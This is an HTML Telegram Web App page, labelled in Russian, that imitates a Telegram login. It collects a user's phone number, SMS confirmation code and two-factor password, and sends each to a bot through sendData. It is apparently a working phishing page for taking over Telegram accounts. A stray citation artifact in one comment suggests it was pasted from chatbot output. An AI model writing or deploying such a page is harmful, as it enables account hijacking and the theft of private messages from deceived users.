<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Авторизация в Telegram</title>
    <!-- Подключаем Telegram Web App JS SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
  <h2>Вход в аккаунт</h2>

  <!-- Форма ввода номера телефона -->
  <div id="phoneForm">
    <label>Номер телефона:</label><br>
    <input id="phone" type="text" placeholder="+7XXXXXXXXXX">
    <button onclick="sendPhone()">Отправить номер</button>
  </div>

  <!-- Форма ввода кода подтверждения (изначально скрыта) -->
  <div id="codeForm" style="display:none; margin-top:10px;">
    <label>Код подтверждения:</label><br>
    <input id="code" type="text" placeholder="Код из SMS">
    <button onclick="sendCode()">Отправить код</button>
  </div>

  <!-- Форма ввода пароля (2FA), по умолчанию скрыта -->
  <div id="passwordForm" style="display:none; margin-top:10px;">
    <label>Пароль (2FA):</label><br>
    <input id="password" type="password" placeholder="Пароль">
    <button onclick="sendPassword()">Отправить пароль</button>
  </div>

  <script>
    // Инициализация объекта WebApp
    const tg = window.Telegram.WebApp;

    // Функция отправки номера телефона боту
    function sendPhone() {
      const phone = document.getElementById('phone').value;
      if (!phone) { alert("Введите номер телефона"); return; }
      // Отправляем JSON-данные боту через sendData:contentReference[oaicite:3]{index=3} 
      tg.sendData(JSON.stringify({action: 'send_phone', phone: phone}));
      // Переходим к форме ввода кода
      document.getElementById('phoneForm').style.display = 'none';
      document.getElementById('codeForm').style.display = 'block';
    }

    // Функция отправки кода подтверждения боту
    function sendCode() {
      const code = document.getElementById('code').value;
      if (!code) { alert("Введите код"); return; }
      tg.sendData(JSON.stringify({action: 'send_code', code: code}));
      // Переходим к форме ввода пароля (на случай 2FA)
      document.getElementById('codeForm').style.display = 'none';
      document.getElementById('passwordForm').style.display = 'block';
    }

    // Функция отправки пароля боту
    function sendPassword() {
      const password = document.getElementById('password').value;
      if (!password) { alert("Введите пароль"); return; }
      tg.sendData(JSON.stringify({action: 'send_password', password: password}));
      // После отправки пароля можно закрыть WebApp (необязательно)
    }
  </script>
</body>
</html>
